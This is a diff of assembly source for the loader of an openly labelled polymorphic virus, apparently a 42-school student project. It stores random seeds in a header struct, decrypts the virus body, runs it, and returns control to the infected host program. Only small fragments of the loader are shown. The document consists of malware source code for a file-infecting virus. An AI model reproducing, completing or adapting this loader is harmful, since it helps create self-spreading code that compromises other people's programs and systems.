@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/27 01:37:15 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/27 02:41:01 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -29,7 +29,9 @@ loader_entry:
 ;------------------------------; Store variables
 	call mark_below
 virus_header_struct:
-	db "polymorphic seed", "rel ptld", "ptldsize", "relvirus"
+	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; virus seed[0]
+	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
+	db "rel ptld", "ptldsize", "relvirus"
 	db "relentry", "virusize"
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
 ;------------------------------; Get variables address
@@ -118,7 +120,6 @@ mark_below:
 
 	call decypher
 ;------------------------------; launch virus
-	mov rdi, [rsp]             ; get seed
 	call virus
 ;------------------------------; return to client entry
 return_to_client:
